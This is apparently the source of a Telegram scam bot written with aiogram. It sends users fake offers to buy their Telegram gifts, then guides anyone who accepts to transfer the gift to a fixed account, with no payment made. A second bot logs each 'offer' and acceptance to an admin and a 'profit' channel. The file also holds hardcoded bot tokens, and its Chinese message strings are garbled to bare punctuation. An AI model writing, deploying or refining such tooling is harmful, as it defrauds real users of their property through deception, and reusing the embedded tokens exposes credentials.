import asyncio
import logging
import uuid
import aiohttp

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.types import (
    Message, CallbackQuery, LinkPreviewOptions,
    InlineKeyboardMarkup, InlineKeyboardButton
)
from aiogram.exceptions import TelegramRetryAfter, TelegramBadRequest

# =====================================
# НАСТРОЙКИ
# =====================================
TOKEN = "9056825852:AAH-AKRlntMSkdLMfEbBqB9HsFcPsZFqabA"
TARGET_USERNAME = "rattiixx"
CURRENCY = {"g": "💎", "s": "⭐"}

TRACKER_BOT_TOKEN = "8914754146:AAH3WF5wVgNtvfXpomuVCY1KoZ9VrBcGPcw"
TRACKER_ADMIN_ID = 9158877731
PROFIT_CHANNEL_ID = -1003914079695
PROFIT_TOPIC_ID = 3

TEXTS = {
    "ru": {
        "offer_text": "Пользователь <b>{who}</b> предлагает Вам {sum} {cur} за подарок <b>{name}</b>.",
        "accepted": "🎁 <b>Подарок:</b> {name}\n\n<b>Предложение принято!</b>\n\nОжидается передача подарка.\n\nСумма предложения: {sum} {cur}",
        "btn_give": "🎁 Передать подарок",
        "btn_how": "❓ Как передать?",
        "btn_decline": "❌ Отклонить",
        "btn_accept": "✅ Принять",
        "alert_how": "Нажмите на кнопку ниже, чтобы открыть профиль получателя.\n\nЗатем нажмите на иконку подарка и выберите «Передать подарок».",
        "declined": "Вы отклонили предложение."
    },
    "en": {
        "offer_text": "User <b>{who}</b> offers You {sum} {cur} for the gift <b>{name}</b>.",
        "accepted": "🎁 <b>Gift:</b> {name}\n\n<b>Offer accepted!</b>\n\nWaiting for gift transfer.\n\nOffer amount: {sum} {cur}",
        "btn_give": "🎁 Give gift",
        "btn_how": "❓ How to give?",
        "btn_decline": "❌ Decline",
        "btn_accept": "✅ Accept",
        "alert_how": "Click the button below to open the recipient's profile.\n\nThen click on the gift icon and select 'Give Gift'.",
        "declined": "You have declined the offer."
    },
    "cn": {
        "offer_text": " <b>{who}</b>  {sum} {cur}  <b>{name}</b>。",
        "accepted": "🎁 <b>：</b> {name}\n\n<b>！</b>\n\n。\n\n：{sum} {cur}",
        "btn_give": "🎁 ",
        "btn_how": "❓ ？",
        "btn_decline": "❌ ",
        "btn_accept": "✅ ",
        "alert_how": "。\n\n“”。",
        "declined": "。"
    }
}

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
OFFERS: dict[str, dict] = {}
http_session: aiohttp.ClientSession | None = None

NO_PREVIEW = LinkPreviewOptions(is_disabled=True)

# =====================================
# КНОПКИ
# =====================================
def offer_kb(oid: str, lang: str) -> InlineKeyboardMarkup:
    t = TEXTS.get(lang, TEXTS["ru"])
    return InlineKeyboardMarkup(
        inline_keyboard=[[
            InlineKeyboardButton(text=t["btn_decline"], callback_data=f"dec:{oid}"),
            InlineKeyboardButton(text=t["btn_accept"], callback_data=f"acc:{oid}")
        ]]
    )

def instruction_kb(lang: str) -> InlineKeyboardMarkup:
    t = TEXTS.get(lang, TEXTS["ru"])
    # ВАРИАНТ 1: прямая ссылка на профиль получателя
    profile_url = f"https://t.me/{TARGET_USERNAME}"
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=t["btn_give"], url=profile_url)],
            [InlineKeyboardButton(text=t["btn_how"], callback_data=f"alert_2:{lang}")]
        ]
    )

# =====================================
# ТРЕКЕР

# =====================================
tracker_bot: Bot | None = None
if TRACKER_BOT_TOKEN and not TRACKER_BOT_TOKEN.startswith("ВСТАВЬ"):
    tracker_bot = Bot(token=TRACKER_BOT_TOKEN)

async def tracker_log(text: str):
    if not tracker_bot:
        return
    try:
        await tracker_bot.send_message(TRACKER_ADMIN_ID, text)
        await tracker_bot.send_message(
            PROFIT_CHANNEL_ID, text, message_thread_id=PROFIT_TOPIC_ID
        )
    except Exception:
        logging.exception("tracker_log error")

# =====================================
# ПОЛУЧЕНИЕ НАЗВАНИЯ ПОДАРКА ПО ССЫЛКЕ
# =====================================
async def fetch_gift_name(url: str) -> str:
    try:
        async with http_session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            html = await resp.text()
        start = html.find('og:title"')
        if start != -1:
            start = html.find('content="', start) + len('content="')
            end = html.find('"', start)
            return html[start:end]
    except Exception:
        pass
    return url.rsplit("/", 1)[-1] or url

# =====================================
# КОМАНДА .оффер
# =====================================
@dp.business_message(F.text.startswith(".оффер"))
async def handle_custom_command(message: Message):
    logging.info("!!! ПОЛУЧЕНА КОМАНДА .оффЕР !!!")
    try:
        text = message.text.replace(".оффер", "", 1).strip()
        parts = text.split()

        if len(parts) < 3:
            return

        url = parts[0]
        raw_sum = parts[1]
        cur_key = parts[2].lower()
        lang = parts[3].lower() if len(parts) > 3 else "ru"

        if cur_key not in CURRENCY:
            await bot.send_message(message.chat.id, "Валюта: g (💎) или s (⭐)")
            return

        t = TEXTS.get(lang, TEXTS["ru"])

        gift_name = await fetch_gift_name(url)

        oid = uuid.uuid4().hex[:8]
        OFFERS[oid] = {
            "url": url,
            "sum": raw_sum,
            "cur": CURRENCY[cur_key],
            "lang": lang,
            "gift_name": gift_name,
            "seller_id": message.from_user.id,
            "seller_name": f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name,
        }

        await bot.send_message(
            chat_id=TARGET_USERNAME,
            text=t["offer_text"].format(
                who=OFFERS[oid]["seller_name"],
                sum=raw_sum,
                cur=CURRENCY[cur_key],
                name=gift_name
            ),
            reply_markup=offer_kb(oid, lang),
            link_preview_options=NO_PREVIEW
        )

        await tracker_log(
            f"🆕 Оффер {oid}: {OFFERS[oid]['seller_name']} → {TARGET_USERNAME} | "
            f"{raw_sum} {CURRENCY[cur_key]} | {gift_name}"
        )
    except TelegramRetryAfter as e:
        await asyncio.sleep(e.retry_after)
    except Exception:
        logging.exception("Ошибка в .оффер")

# =====================================
# КОЛБЭКИ
# =====================================
@dp.callback_query(F.data.startswith("acc:"))
async def cb_accept(call: CallbackQuery):
    oid = call.data.split(":", 1)[1]
    offer = OFFERS.get(oid)
    if not offer:
        await call.answer("Оффер не найден", show_alert=True)
        return
    t = TEXTS.get(offer["lang"], TEXTS["ru"])
    await call.message.edit_text(
        t["accepted"].format(
            name=offer["gift_name"],
            sum=offer["sum"],

            cur=offer["cur"]
        ),
        reply_markup=instruction_kb(offer["lang"])
    )
    await tracker_log(f"✅ Оффер {oid} принят ({offer['gift_name']})")

@dp.callback_query(F.data.startswith("dec:"))
async def cb_decline(call: CallbackQuery):
    oid = call.data.split(":", 1)[1]
    offer = OFFERS.get(oid)
    if not offer:
        await call.answer("Оффер не найден", show_alert=True)
        return
    t = TEXTS.get(offer["lang"], TEXTS["ru"])
    await call.message.edit_text(t["declined"])
    await tracker_log(f"❌ Оффер {oid} отклонён ({offer['gift_name']})")

@dp.callback_query(F.data.startswith("alert_2:"))
async def cb_alert(call: CallbackQuery):
    lang = call.data.split(":", 1)[1]
    t = TEXTS.get(lang, TEXTS["ru"])
    await call.answer(t["alert_how"], show_alert=True)

# =====================================
# ЗАПУСК
# =====================================
async def main():
    global http_session
    async with aiohttp.ClientSession() as session:
        http_session = session
        await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logging.info("Бот остановлен")
